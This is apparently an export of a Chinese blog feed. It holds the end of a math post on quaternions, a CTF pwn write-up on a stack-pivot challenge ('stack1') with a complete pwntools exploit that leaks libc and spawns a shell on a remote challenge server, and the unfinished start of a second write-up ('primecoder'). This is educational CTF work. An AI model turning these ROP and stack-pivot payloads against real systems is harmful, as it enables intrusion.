inline">\(\boldsymbol{M}=\boldsymbol{p}\times\boldsymbol{E}\)</span></p><h2 id="四元数quaternions">四元数(quaternions)</h2><h3 id="定义">定义</h3><p><span class="math display">\[q=s+x i+y j+ z k\]</span></p><p>其中，<span class="math inline">\(i,j,k\)</span> 的运算规则同 <spanclass="math inline">\(\mathbb{R}^3\)</span> 中单位向量 <spanclass="math inline">\(\boldsymbol{i},\boldsymbol{j},\boldsymbol{k}\)</span> ，即右手螺旋法则</p><p>由</p><p><span class="math display">\[\begin{align}\boldsymbol{i} \times \boldsymbol{j}&amp;=\boldsymbol{k} \\\boldsymbol{j}\times \boldsymbol{i} &amp;=-\boldsymbol{k}\end{align}\]</span></p><p>则同理有</p><p><span class="math display">\[\begin{align}i j&amp;=k \\ j i&amp;=-k\end{align}\]</span></p><p>同时规定 <span class="math inline">\(ijk=i^2=j^2=k^2=-1\)</span></p><p>一个四元数可以记作 <spanclass="math inline">\(q=[s,\boldsymbol{v}]\)</span>，即后面的纯“虚”部可以记作一个向量 <spanclass="math inline">\(\boldsymbol{v}\)</span></p><h3 id="运算法则">运算法则</h3><h4 id="加法减法数乘">加法、减法、数乘</h4><p>形同虚数，固略</p><h4 id="乘法">乘法</h4><p>现有两个四元数</p><p><span class="math display">\[\begin{align}q_1&amp;=s_1+x_1i+y_1j +z_1k \\ q_2&amp;=s_2+x_2i+y_2j+z_2k\end{align}\]</span></p><p>则</p><p><span class="math display">\[\begin{align}q_1q_2=&amp;s_1s_2+s_2(x_1i+y_1j+z_1k)+s_1(x_2i+y_2j+z_2k)\\&amp;-x_1x_2-y_1y_2-z_1z_2\\&amp;+x_1y_2k-y_1x_2k+y_1z_2i-z_1x_2i+z_1x_2j-x_1z_2j\end{align}\]</span></p><p>最下面那个式子类似于叉乘，即</p><p><span class="math display">\[\begin{vmatrix} x_1 &amp; y_1 &amp; z_1 \\ x_2 &amp; y_2 &amp; z_2 \\ i&amp; j &amp; k \\\end{vmatrix}\]</span></p><p>将实虚部分离，可以得到</p><p><span class="math display">\[q_1q_2=[s_1s_2-\boldsymbol{v_1}\cdot \boldsymbol{v_2},s_1\boldsymbol{v_2}+s_2 \boldsymbol{v_1}+\boldsymbol{v_1}\times\boldsymbol{v_2}]\]</span></p><p>由此可以看出，四元数乘法不满足交换律</p><h4 id="数量积">数量积</h4><p><span class="math display">\[q_1\cdot q_2=s_1s_2+x_1x_2+y_1y_2+z_1z_2\]</span></p><h4 id="共轭">共轭</h4><p>若设 <span class="math inline">\(q=[s,\boldsymbol{v}]\)</span>，则它的共轭为 <spanclass="math inline">\(q^*=[s,-\boldsymbol{v}]\)</span></p><h4 id="模">模</h4><p><span class="math display">\[\begin{align}|q|&amp;=\sqrt{s^2+x^2+y^2+z^2} \\&amp;=\sqrt{s^2+\boldsymbol{v}^2}\end{align}\]</span></p><p>另</p><p><span class="math display">\[qq^*=q^*q=|q|^2\]</span></p><h4 id="单位四元数">单位四元数</h4><p><span class="math display">\[\hat{q}=\frac{q}{|q|}\]</span></p><h4 id="求逆">求逆</h4><p>定义 <span class="math inline">\(qq^{-1}=1\)</span>，则有下面推导</p><p><span class="math display">\[\begin{align}qq^{-1}&amp;=1 \\ q^*qq^{-1}&amp;=q^*\\ |q|^2q^{-1}&amp;=q^*\\q^{-1}&amp;=\frac{q^*}{|q|^2}\end{align}\]</span></p><h3 id="三维旋转">三维旋转</h3><p>类比于二维向量旋转，我们希望构造一个单位四元数 <spanclass="math inline">\(q\)</span> 使得一个三维空间中的一个向量 <spanclass="math inline">\(\boldsymbol{p}\)</span> 绕轴 <spanclass="math inline">\(\boldsymbol{\hat{v}}\)</span> 旋转 <spanclass="math inline">\(\theta\)</span> 角到 <spanclass="math inline">\(\boldsymbol{p&#39;}\)</span> ，即表达式为 <spanclass="math inline">\(p&#39;=q p\)</span> （这里 <spanclass="math inline">\(\boldsymbol{p},\boldsymbol{p&#39;}\)</span>都已被换成对应的四元数，其中实部为零）</p><p>然而事实上，这并不正确，因为</p><p><span class="math display">\[\begin{align}p&#39;&amp;=qp \\&amp;=[\cos\theta,\sin \theta\boldsymbol{\hat{v}}][0,\boldsymbol{p}]\\&amp;=[-\sin \theta\boldsymbol{p}\cdot \boldsymbol{\hat{v}},\cos\theta \boldsymbol{p}+\sin\theta \boldsymbol{\hat{v}}\times \boldsymbol{p}]\end{align}\]</span></p><p>如果 <span class="math inline">\(\boldsymbol{p}\not\perp\boldsymbol{\hat{v}}\)</span> 则 <spanclass="math inline">\(Re(p&#39;)\not=0\)</span> ，则 <spanclass="math inline">\(p&#39;\)</span> 不为纯四元数，且 <spanclass="math inline">\(|p&#39;|\not=|p|\)</span></p><p>事实上可以证明，若 <spanclass="math inline">\(\boldsymbol{p}\)</span> 绕轴 <spanclass="math inline">\(\boldsymbol{\hat{v}}\)</span> 旋转 <spanclass="math inline">\(2\theta\)</span> 到 <spanclass="math inline">\(\boldsymbol{p&#39;}\)</span> ，则需如下</p><p><span class="math display">\[\begin{align}p&#39;&amp;=qpq^{-1} \\ q^{-1}&amp;=q^{*}=[\cos\theta,\sin \theta\boldsymbol{\hat{v}}]\end{align}\]</span></p><h3 id="参考文献">参考文献</h3><p><ahref="https://www.3dgep.com/understanding-quaternions/">UnderstandingQuaternions</a></p><h2 id="tikz画图练习">tikz画图练习</h2><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\begin</span>&#123;document&#125;<br><span class="hljs-keyword">\begin</span>&#123;tikzpicture&#125;<br><span class="hljs-keyword">\draw</span>[-&gt;] (0.5,5)--(5.5,5);<br><span class="hljs-keyword">\draw</span>[-&gt;] (0.5,1)--(5.5,1);<br><span class="hljs-keyword">\draw</span>[-&gt;] (0,1.5)--(0,4.5);<br><span class="hljs-keyword">\draw</span>[-&gt;] (6,1.5)--(6,4.5);<br><span class="hljs-keyword">\node</span> at (0,1) &#123;<span class="hljs-built_in">$</span>U<span class="hljs-built_in">^</span>&#123;**&#125;<span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\node</span> at (0,5) &#123;<span class="hljs-built_in">$</span>U<span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\node</span> at (6,5) &#123;<span class="hljs-built_in">$</span>V<span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\node</span> at (6,1) &#123;<span class="hljs-built_in">$</span>V<span class="hljs-built_in">^</span>&#123;**&#125;<span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\node</span>[above] at (3,5) &#123;<span class="hljs-built_in">$</span><span class="hljs-keyword">\varphi</span><span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\node</span>[below] at (3,1) &#123;<span class="hljs-built_in">$</span><span class="hljs-keyword">\varphi</span><span class="hljs-built_in">^</span>&#123;**&#125;<span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\node</span>[left] at (0,3) &#123;<span class="hljs-built_in">$</span><span class="hljs-keyword">\eta</span><span class="hljs-built_in">_</span>U<span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\node</span>[left] at (6,3) &#123;<span class="hljs-built_in">$</span><span class="hljs-keyword">\eta</span><span class="hljs-built_in">_</span>V<span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\node</span>[right] at (0,3) &#123;<span class="hljs-built_in">$</span><span class="hljs-keyword">\sim</span><span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\node</span>[right] at (6,3) &#123;<span class="hljs-built_in">$</span><span class="hljs-keyword">\sim</span><span class="hljs-built_in">$</span>&#125;;<br><span class="hljs-keyword">\end</span>&#123;tikzpicture&#125;<br><span class="hljs-keyword">\end</span>&#123;document&#125;<br></code></pre></td></tr></table></figure><!-- tikzjax-placeholder-090e2def7886b9ad6fcfb92484b15da5 -->]]></content>
    
    
    <categories>
      
      <category>数理基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数学</tag>
      
      <tag>物理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一道校内pwn题——stack1</title>
    <link href="/2024/03/01/ucas-ctf-pwn-stack1/"/>
    <url>/2024/03/01/ucas-ctf-pwn-stack1/</url>
    
    <content type="html"><![CDATA[<p>关于栈迁移的一道题 <span id="more"></span></p><h2 id="准备步骤">准备步骤</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">checksec stack1<br><br><span class="hljs-comment">#    Arch:     amd64-64-little</span><br><span class="hljs-comment">#    RELRO:    Partial RELRO</span><br><span class="hljs-comment">#    Stack:    No canary found</span><br><span class="hljs-comment">#    NX:       NX enabled</span><br><span class="hljs-comment">#    PIE:      No PIE (0x3fe000)</span><br></code></pre></td></tr></table></figure><p>ida检查，发现漏洞，在<code>sub_400676()</code>中有16个字节的溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_400676</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">80</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h] BYREF</span><br><br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">96uLL</span>);      <span class="hljs-comment">//溢出</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>但这是64为程序，且溢出只能覆盖<code>rbp</code>和返回地址，这就导致不能一次性构造参数并调用。我们可以考虑进行<strong>栈迁移</strong>，把执行流的栈转到别的地方。</p><h2 id="栈迁移原理">栈迁移原理</h2><h3 id="条件">条件</h3><p>栈迁移主要是针对溢出长度不够，无法进行传参（比如本题只够覆盖rbp和返回地址），但需要可以覆盖到rbp以迁移栈。</p><h3 id="关键指令-leaveret">关键指令 <code>leave;ret;</code></h3><p><code>leave</code> 指令可以看成两条指令<code>mov rsp,rbp; pop rbp;</code>，可以看出这条指令原本是用来还原调用函数前的栈帧的，但如果我们提前改变<code>rbp</code>的值，譬如，改成比现在 <code>rsp</code>地址还低的位置（即栈的高处），那么在执行语句之后栈帧就在上方，可以利用之前在栈中写入的数据（题中的<code>buffer</code> ）控制程序流程了。</p><p>如果不清楚的话，可再看看这篇文章：<ahref="https://www.cnblogs.com/ZIKH26/articles/15817337.html">栈迁移的原理&amp;&amp;实战运用</a></p><h2 id="构造payload">构造payload</h2><h3 id="泄露rbp">泄露<code>rbp</code></h3><p>因为我们要修改<code>rbp</code>，所以我们要先知道原来<code>rbp</code>的值，再在其基础上进一步修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">1</span>))<br>payload1=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">80</span><br>conn.send(payload1)<br>old_rbp_addr=<span class="hljs-built_in">int</span>.from_bytes(conn.recv()[<span class="hljs-number">80</span>:<span class="hljs-number">86</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<span class="hljs-comment"># &gt;</span><br></code></pre></td></tr></table></figure><p>如果rbp的低位中没有<code>\x00</code>的话，puts就会将80个a和<code>rbp</code>打印出来，截取6个字符是因为64位的栈从<code>0x7f??????????</code>开始，前面有两个<code>\x00</code>字符，puts打印不出来</p><h3 id="泄露libc基址">泄露libc基址</h3><p>我们gdb一下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">gdb stack1<br>b *0x0000000000400710   <span class="hljs-comment">#这是主循环函数sub_400676()的入口</span><br>r<br>s                       <span class="hljs-comment">#单步进入函数sub_400676()</span><br>n<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gdb">──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────<br>   0x400676    push   rbp<br> ► 0x400677    mov    rbp, rsp<br>   0x40067a    sub    rsp, 0x50<br>   0x40067e    lea    rdx, [rbp - 0x50]<br>   0x400682    mov    eax, 0<br>   0x400687    mov    ecx, 0xa<br>   0x40068c    mov    rdi, rdx<br>   0x40068f    rep stosq qword ptr [rdi], rax<br>    ↓<br>   0x40068f    rep stosq qword ptr [rdi], rax<br><br>───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────<br>00:0000│ rsp 0x7fffffffd7c0 —▸ 0x7fffffffd7e0 —▸ 0x400730 ◂— 0x41ff894156415741<br>01:0008│     0x7fffffffd7c8 —▸ 0x400715 ◂— 0xb890f0eb0274c085<br>02:0010│     0x7fffffffd7d0 —▸ 0x7fffffffd8c8 —▸ 0x7fffffffdb6f ◂— &#x27;/home/kali/ctf/pwn/q29_stack1/stack1&#x27;<br>03:0018│     0x7fffffffd7d8 ◂— 0x100000000<br>04:0020│ rbp 0x7fffffffd7e0 —▸ 0x400730 ◂— 0x41ff894156415741<br>05:0028│     0x7fffffffd7e8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov edi, eax<br>06:0030│     0x7fffffffd7f0 ◂— 0x1<br>07:0038│     0x7fffffffd7f8 —▸ 0x7fffffffd8c8 —▸ 0x7fffffffdb6f ◂— &#x27;/home/kali/ctf/pwn/q29_stack1/stack1&#x27;<br></code></pre></td></tr></table></figure><p>其中<code>0x7fffffffd7c8</code>是新建栈帧返回地址所在，<code>0x7fffffffd7c0</code>是原来rbp地址所在，值为<code>0x7fffffffd7e0</code>再加上buffer的0x50大小，就可以计算新rbp及栈顶的位置了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">now_rbp_addr=old_rbp_addr-<span class="hljs-number">0x20</span><br>now_esp_addr=now_rbp_addr-<span class="hljs-number">0x50</span><br>return_addr2=<span class="hljs-number">0x0000000000400710</span>  <span class="hljs-comment">#call            rbp_3|  rbp_2          normal_ret</span><br>payload2=p64(now_rbp_addr)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(return_addr2)+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">0x8</span>*<span class="hljs-number">5</span>)+p64(now_esp_addr)+p64(leave_addr)<br>conn.send(payload2)<br>puts_addr=<span class="hljs-built_in">int</span>.from_bytes(conn.recvuntil(<span class="hljs-string">b&#x27;\x7f\x0a\x3e&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这个payload将新栈帧转到原来的栈顶并执行传参和对puts的调用</p><h3 id="pwn-it">Pwn it！</h3><p>计算binsh和system真实地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">libcbase=puts_addr-puts_libc<br>abinsh_addr=libcbase+abinsh_libc<br>system_addr=libcbase+system_libc<br></code></pre></td></tr></table></figure><p>与上一步相同的方法构造新栈帧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">now_ebp_addr-=<span class="hljs-number">56</span><br>now_esp_addr=now_ebp_addr-<span class="hljs-number">0x50</span><br>payload3=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(rdi_addr)+p64(abinsh_addr)+p64(system_addr)+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">0x8</span>*<span class="hljs-number">4</span>)+p64(now_esp_addr)+p64(leave_addr) <span class="hljs-comment">#前面8个a是新的rbp，但不过这个rbp已经没用了，所以可以随便填</span><br>conn.send(payload3)<br>conn.interactive()<br></code></pre></td></tr></table></figure><h2 id="exp">exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>ip=<span class="hljs-string">&quot;124.16.75.117&quot;</span><br>port=<span class="hljs-number">51001</span><br>conn=connect(ip,port)<br><span class="hljs-comment">#conn=process(&quot;./pwn/q29_stack1/stack1&quot;)</span><br><span class="hljs-comment">#conn=gdb.debug(&#x27;./pwn/q29_stack1/stack1&#x27;,&#x27;b *0x00000000004006C4&#x27;)</span><br>libc=ELF(<span class="hljs-string">&#x27;./pwn/q29_stack1/libc.so.6&#x27;</span>)<br>puts_libc=libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_libc=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>abinsh_libc=libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br>leave_addr=<span class="hljs-number">0x00000000004006BE</span><br>rdi_addr=<span class="hljs-number">0x0000000000400793</span><br>puts_got=<span class="hljs-number">0x0000000000601020</span><br>puts_plt=<span class="hljs-number">0x0000000000400530</span><br><br><span class="hljs-comment">#***************1***************</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;111111111111111111111111&quot;</span>)<br><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">1</span>))<br>payload1=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">80</span><br>conn.send(payload1)<br>old_ebp_addr=<span class="hljs-built_in">int</span>.from_bytes(conn.recv()[<span class="hljs-number">80</span>:<span class="hljs-number">86</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<span class="hljs-comment"># &gt; is here</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(old_ebp_addr))<br><br><span class="hljs-comment">#***************2***************</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;222222222222222222222222&quot;</span>)<br>now_ebp_addr=old_ebp_addr-<span class="hljs-number">0x20</span><br>now_esp_addr=now_ebp_addr-<span class="hljs-number">0x50</span><br>return_addr2=<span class="hljs-number">0x0000000000400710</span>  <span class="hljs-comment">#call            ebp_3|  ebp_2          normal_ret</span><br>payload2=p64(now_ebp_addr)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(return_addr2)+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">0x8</span>*<span class="hljs-number">5</span>)+p64(now_esp_addr)+p64(leave_addr)<br>conn.send(payload2)<br>puts_addr=<span class="hljs-built_in">int</span>.from_bytes(conn.recvuntil(<span class="hljs-string">b&#x27;\x7f\x0a\x3e&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>libcbase=puts_addr-puts_libc<br>abinsh_addr=libcbase+abinsh_libc<br>system_addr=libcbase+system_libc<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr),<span class="hljs-built_in">hex</span>(libcbase))<br><br><br><span class="hljs-comment">#****************3***************</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;33333333333333333333333&quot;</span>)<br>now_ebp_addr-=<span class="hljs-number">56</span><br>now_esp_addr=now_ebp_addr-<span class="hljs-number">0x50</span><br>payload3=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(rdi_addr)+p64(abinsh_addr)+p64(system_addr)+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">0x8</span>*<span class="hljs-number">4</span>)+p64(now_esp_addr)+p64(leave_addr)<br>conn.send(payload3)<br>conn.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf_pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
      <tag>栈迁移</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一道校内pwn题——primecoder</title>
    <link href="/2024/02/26/ucas-ctf-pwn-primecoder/"/>
    <url>/2024/02/26/ucas-ctf-pwn-primecoder/</url>
    
    <content type="html"><![CDATA[<p>其实感觉这道题有点偏？🤔🤔🤔 <span id="more"></span></p><h2 id="大致分析检查">大致分析检查</h2><p>先走一遍流程：checksec ida</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">┌──(kali㉿helloeveryone)-[~/ctf/pwn/q31_primecoder]</span><br><span class="hljs-string">└─$</span> <span class="hljs-string">checksec</span> <span class="hljs-string">primecoder</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/kali/ctf/pwn/q31_primecoder/primecoder&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">unknown</span> <span class="hljs-bullet">-</span> <span class="hljs-string">GNU_STACK</span> <span class="hljs-string">missing</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-string">Executable</span><br>    <span class="hljs-attr">RWX:</span>      <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span><br>    <span class="hljs-attr">FORTIFY:</span>  <span class="hljs-string">Enabled</span><br></code></pre></td></tr></table></figure><p>在ida里F5失效，锁定那一行，分析汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nasm">call rbp<br></code></pre></td></tr></table></figure><p>结合上下文来看，应该是要在rbp处执行shellcode</p><h2 id="程序流程分析">程序流程分析</h2><p>首先应清楚linux-amd64调用函数传参约定</p><h3 id="入参">入参</h3><ul><li>在参数都是小于等于 16 字节的整数/枚举/结构体时，前六个参数分别由<strong>RDI、RSI、RDX、RCX、R8、R9</strong><strong><em>（这部分是重点，有助于看懂本题涉及代码）</em></strong>传递（超过 8字节的用连续的两个寄存器），剩下的参数用栈传递（参数在内存中的相对位置恰好和参数实际位置一致）。小于64 位的值占用寄存器的低位，高位数据无效。</li><li>在参数都是浮点时，大致和前面一样，不同的是前八个参数用的寄存器是xmm0～xmm7。</li><li>如果是整形和浮点混用，那么依次用整形寄存器和浮点寄存器传递，直到把这6+8 个寄存器用完为止。</li><li>在参数存在大于 16 字节的结构体是直接用栈传递。</li></ul><h3 id="返回值">返回值</h3><ul><li>被调用函数的返回值是64位以内（包括64位）的整形或指针时，则返回值会被存放于RAX，如果返回值是128位的，则高64位放入 RDX；</li><li>如果返回值是浮点值，则返回值存放在XMM0；</li><li>更大的返回值(比如结构体)，由调用方在栈上分配空间，并由 RCX持有该空间的指针并传递给被调用函数，因此整型参数使用的寄存器依次右移一格，实际只可以利用RDI，RSI，RDX，R8，R9，5个寄存器，其余参数通过栈传递。函数调用结束后，RAX返回该空间的指针（即函数调用开始时的 RCX 值）。</li></ul><h3 id="正式分析">正式分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs nasm">.text:0000000000400560 ; int __cdecl main(int argc, const char **argv, const char **envp)<br>.text:0000000000400560                 public main<br>.text:0000000000400560 main            proc near               ; DATA XREF: _start+1D↓o<br>.text:0000000000400560<br>.text:0000000000400560 var_42C         = dword ptr -42Ch<br>.text:0000000000400560 var_41C         = qword ptr -41Ch<br>.text:0000000000400560<br>.text:0000000000400560 ; __unwind &#123;<br>.text:0000000000400560                 push    r12<br>.text:0000000000400562                 push    rbp<br>.text:0000000000400563                 xor     ecx, ecx        ; n<br>.text:0000000000400565                 push    rbx<br>.text:0000000000400566                 mov     edx, 2          ; modes<br>.text:000000000040056B                 xor     esi, esi        ; buf<br>.text:000000000040056D                 xor     ebx, ebx<br>.text:000000000040056F                 sub     rsp, 420h<br>.text:0000000000400576                 mov     rdi, cs:stdin@@GLIBC_2_2_5 ; stream<br>.text:000000000040057D                 lea     rbp, [rsp+32]<br>.text:0000000000400582                 lea     r12, [rsp+28]<br>.text:0000000000400587                 call    _setvbuf<br>.text:000000000040058C                 mov     rdi, cs:__bss_start ; stream<br>.text:0000000000400593                 xor     ecx, ecx        ; n<br>.text:0000000000400595                 mov     edx, 2          ; modes<br>.text:000000000040059A                 xor     esi, esi        ; buf<br>.text:000000000040059C                 call    _setvbuf<br>.text:00000000004005A1                 lea     rsi, aBufferP   ; &quot;buffer = %p.\n&quot;<br>.text:00000000004005A8                 mov     rdx, 